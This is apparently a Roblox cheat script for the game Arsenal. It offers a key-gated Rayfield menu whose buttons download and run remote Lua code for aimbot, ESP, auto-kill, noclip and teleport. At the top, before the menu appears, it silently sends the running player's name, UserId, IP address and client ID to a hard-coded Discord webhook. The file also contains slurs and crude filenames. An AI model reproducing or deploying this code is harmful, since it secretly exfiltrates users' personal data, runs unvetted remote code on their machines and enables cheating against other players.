HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1370309132456038490/GPyFVFNd0y09Bgw1aTE0fbbS-poUyAOhpY16Yy3IglNSAXvuun-0wmgTsgNoVU3JaDe6"
 
local request = syn and syn.request or request or http and http.request or http_request
 
local response = request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "",
                ["description"] = game.Players.LocalPlayer.Name .." Logged into Arsenal Script",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "Player Name : ",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    }, {
                        ["name"] = "UserId : ",
                        ["value"] = game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "User Profile : ",
                        ["value"] = "https://www.roblox.com/users/" ..
                            game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "IP: ",
                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                        ["inline"] = true
                    }, {
                        ["name"] = "Client Id : ",
                        ["value"] = game:GetService("RbxAnalyticsService")
                            :GetClientId(),
                        ["inline"] = true
                    }
                }
            }
        }
    })
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Danh sách UserId bị cấm
local blacklist = {
    [8533167956] = true,
    [987654321] = true
}

-- Kiểm tra và đá người chơi nếu nằm trong danh sách
if blacklist[LocalPlayer.UserId] then
    game.StarterGui:SetCore("SendNotification", {
        Title = "🚫 WARN",
        Text = "You have been blacklisted by the script owner.",
        Duration = 10
    })

    task.wait(5)

    LocalPlayer:Kick("You have been blacklisted by the script owner.")
    return -- Đảm bảo không chạy các dòng sau
end

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "                                Arsenal",
    LoadingTitle = "WSP",
    LoadingSubtitle = "Made by Chungdz credit to Friend",
    ConfigurationSaving = {
       Enabled = flase,
       FolderName = nil, 
       FileName = "Nigga 69"
    },

    KeySystem = true,
    KeySettings = {
       Title = "Arsenal",
       Subtitle = "Made by Chung credit #Chungdz",
       Note = "this guy is gay gbaox_01",
       FileName = "0", 
       SaveKey = true,
       GrabKeyFromSite = true,
       Key = {"https://raw.githubusercontent.com/Chungdz09/Script-chung-dz/refs/heads/main/Key"}
    }
 })

 local MainTab = Window:CreateTab("🏠 Main", nil) 
 local MainSection = MainTab:CreateSection("Other Scripts")

local Button = MainTab:CreateButton({
   Name = "Ctrl + click TP",
   Callback = function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Click%20Teleport.txt"))()  
  end,
})

local Button = MainTab:CreateButton({
   Name = "Infinite yield",
   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()  
  end,
})

local Button = MainTab:CreateButton({
   Name = "NoClip",
   Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Stallion2108/Script-chung-dz/refs/heads/main/Noclip.lua'))()  
  end,
})

local Button = MainTab:CreateButton({
   Name = "Dark Dex",
   Callback = function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
  end,
})

local Button = MainTab:CreateButton({
   Name = "Draw Bones",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Stallion2108/Script-chung-dz/refs/heads/main/Draw%20Bones.lua"))()
  end,
})

local Button = MainTab:CreateButton({
   Name = "ESP",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Stallion2108/Script-chung-dz/refs/heads/main/ArsenalESP.lua"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "Draw Reddot",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Stallion2108/Script-chung-dz/refs/heads/main/Draw%20Reddot%20on%20head"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "Aimbot FOV Use F On/Off",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Stallion2108/Script-chung-dz/refs/heads/main/Arsenal%20Aimbot.txt"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "Auto KillPlayer TeamCheck X On/Off",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Stallion2108/Script-chung-dz/refs/heads/main/Suck%20My%20DicK.lua"))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "Auto KillPlayer No TeamCheck Z On/Off",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Stallion2108/Script-chung-dz/refs/heads/main/Suck%20My%20Dick%202.lua"))()
   end,
})
